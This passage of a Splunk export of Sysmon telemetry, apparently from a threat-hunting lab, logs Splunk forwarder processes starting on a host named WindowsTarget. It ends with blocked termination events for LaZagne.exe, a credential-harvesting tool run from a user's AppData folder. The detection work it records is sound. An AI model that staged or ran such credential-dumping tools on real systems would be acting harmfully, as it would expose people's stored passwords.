AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:00:13.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99953,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99953,main,1,,,,,,,,,,,,,"splunk-netmon.exe","Microsoft Windows","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe""","C:\Windows\system32\","splunk-netmon.exe","{8e02ef74-5ced-675b-6108-000000002a00}","MD5=756110565070D47561719347DCA1DCC3,SHA256=06E3FE75815AEBB30EFAC1A85BCB41C37660B8CFE052544AA694DD569E5AF2D0,IMPHASH=089EDE8293334E8B52F638440313FE63",11316,System,"splunk-netmon.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe""","Splunk Inc.",WindowsTarget,,,,,"C:\Windows\system32\","Active Directory monitor",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:12.694</Data><Data Name='ProcessGuid'>{8e02ef74-5cec-675b-6008-000000002a00}</Data><Data Name='ProcessId'>9648</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe</Data><Data Name='FileVersion'>9.3.2</Data><Data Name='Description'>Active Directory monitor</Data><Data Name='Product'>splunk Application</Data><Data Name='Company'>Splunk Inc.</Data><Data Name='OriginalFileName'>splunk-admon.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=A836DF719BC5FB4821031DEA6C5322AA,SHA256=BD54D780B1BAB2CFF649EC25152AA4D9DEC7308A19F6C314FBFB5F4D14E1C868,IMPHASH=7B2E714E806DF6D24F76D65BEACA3A28</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99952,,,"9.3.2",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=A836DF719BC5FB4821031DEA6C5322AA,SHA256=BD54D780B1BAB2CFF649EC25152AA4D9DEC7308A19F6C314FBFB5F4D14E1C868,IMPHASH=7B2E714E806DF6D24F76D65BEACA3A28",,,7B2E714E806DF6D24F76D65BEACA3A28,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,A836DF719BC5FB4821031DEA6C5322AA,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"splunk-admon.exe",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5cec-675b-6008-000000002a00}","'3780'",9648,,,,"splunk Application",,,,,,99952,99952,,,,,"-",,BD54D780B1BAB2CFF649EC25152AA4D9DEC7308A19F6C314FBFB5F4D14E1C868,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:00:12.6963974Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:12.6963974Z'/><EventRecordID>99952</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:00:12.6963974Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:00:12.694",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:12.6963974Z'/><EventRecordID>99952</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:12.694</Data><Data Name='ProcessGuid'>{8e02ef74-5cec-675b-6008-000000002a00}</Data><Data Name='ProcessId'>9648</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe</Data><Data Name='FileVersion'>9.3.2</Data><Data Name='Description'>Active Directory monitor</Data><Data Name='Product'>splunk Application</Data><Data Name='Company'>Splunk Inc.</Data><Data Name='OriginalFileName'>splunk-admon.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=A836DF719BC5FB4821031DEA6C5322AA,SHA256=BD54D780B1BAB2CFF649EC25152AA4D9DEC7308A19F6C314FBFB5F4D14E1C868,IMPHASH=7B2E714E806DF6D24F76D65BEACA3A28</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:00:12.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99952,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99952,main,1,,,,,,,,,,,,,"splunk-admon.exe","Microsoft Windows","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe""","C:\Windows\system32\","splunk-admon.exe","{8e02ef74-5cec-675b-6008-000000002a00}","MD5=A836DF719BC5FB4821031DEA6C5322AA,SHA256=BD54D780B1BAB2CFF649EC25152AA4D9DEC7308A19F6C314FBFB5F4D14E1C868,IMPHASH=7B2E714E806DF6D24F76D65BEACA3A28",9648,System,"splunk-admon.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe""","Windows (R) Win 7 DDK provider",WindowsTarget,,,,,"C:\Windows\system32\","SplunkMonNoHandle Control Program",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:11.966</Data><Data Name='ProcessGuid'>{8e02ef74-5ceb-675b-5f08-000000002a00}</Data><Data Name='ProcessId'>6340</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe</Data><Data Name='FileVersion'>10.0.10011.16384</Data><Data Name='Description'>SplunkMonNoHandle Control Program</Data><Data Name='Product'>Windows (R) Win 7 DDK driver</Data><Data Name='Company'>Windows (R) Win 7 DDK provider</Data><Data Name='OriginalFileName'>SplunkMonNoHandle.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=B6C7EE9D75B2CC2B9A92D862B91E1943,SHA256=3FADA20382E33E6E270311B68BBAFFEAFF8F4C9367ABC255914C0D3CC542885F,IMPHASH=2EAA996E48B92C5E3FBBCC0A72683CB6</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99951,,,"10.0.10011.16384",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=B6C7EE9D75B2CC2B9A92D862B91E1943,SHA256=3FADA20382E33E6E270311B68BBAFFEAFF8F4C9367ABC255914C0D3CC542885F,IMPHASH=2EAA996E48B92C5E3FBBCC0A72683CB6",,,2EAA996E48B92C5E3FBBCC0A72683CB6,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,B6C7EE9D75B2CC2B9A92D862B91E1943,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"SplunkMonNoHandle.exe",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5ceb-675b-5f08-000000002a00}","'3780'",6340,,,,"Windows (R) Win 7 DDK driver",,,,,,99951,99951,,,,,"-",,3FADA20382E33E6E270311B68BBAFFEAFF8F4C9367ABC255914C0D3CC542885F,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:00:11.9681890Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:11.9681890Z'/><EventRecordID>99951</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:00:11.9681890Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:00:11.966",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:11.9681890Z'/><EventRecordID>99951</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:11.966</Data><Data Name='ProcessGuid'>{8e02ef74-5ceb-675b-5f08-000000002a00}</Data><Data Name='ProcessId'>6340</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe</Data><Data Name='FileVersion'>10.0.10011.16384</Data><Data Name='Description'>SplunkMonNoHandle Control Program</Data><Data Name='Product'>Windows (R) Win 7 DDK driver</Data><Data Name='Company'>Windows (R) Win 7 DDK provider</Data><Data Name='OriginalFileName'>SplunkMonNoHandle.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=B6C7EE9D75B2CC2B9A92D862B91E1943,SHA256=3FADA20382E33E6E270311B68BBAFFEAFF8F4C9367ABC255914C0D3CC542885F,IMPHASH=2EAA996E48B92C5E3FBBCC0A72683CB6</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:00:11.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99951,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99951,main,1,,,,,,,,,,,,,"SplunkMonNoHandle.exe","Microsoft Windows","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe""","C:\Windows\system32\","splunk-MonitorNoHandle.exe","{8e02ef74-5ceb-675b-5f08-000000002a00}","MD5=B6C7EE9D75B2CC2B9A92D862B91E1943,SHA256=3FADA20382E33E6E270311B68BBAFFEAFF8F4C9367ABC255914C0D3CC542885F,IMPHASH=2EAA996E48B92C5E3FBBCC0A72683CB6",6340,System,"splunk-MonitorNoHandle.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",5,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:02.791</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='User'>WindowsTarget\inf808</Data>","Process terminated",5,99950,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,,,,,,,99950,99950,,,,,"-",,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:00:02.7922109Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:02.7922109Z'/><EventRecordID>99950</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,5,Shell,,"'5104'","2024-12-12T22:00:02.7922109Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:00:02.791",3,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:02.7922109Z'/><EventRecordID>99950</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:02.791</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T17:00:02.000-0500",blocked,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99950,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99950,main,1,,,,,,,,,,,,,,"Microsoft Windows",,,,,,,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process terminated",5,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",5,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:02.744</Data><Data Name='ProcessGuid'>{8e02ef74-5cdf-675b-5808-000000002a00}</Data><Data Name='ProcessId'>11200</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='User'>WindowsTarget\inf808</Data>","Process terminated",5,99949,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5cdf-675b-5808-000000002a00}","'3780'",11200,,,,,,,,,,99949,99949,,,,,"-",,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:00:02.7453598Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:02.7453598Z'/><EventRecordID>99949</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,5,Shell,,"'5104'","2024-12-12T22:00:02.7453598Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:00:02.744",3,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:02.7453598Z'/><EventRecordID>99949</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:02.744</Data><Data Name='ProcessGuid'>{8e02ef74-5cdf-675b-5808-000000002a00}</Data><Data Name='ProcessId'>11200</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-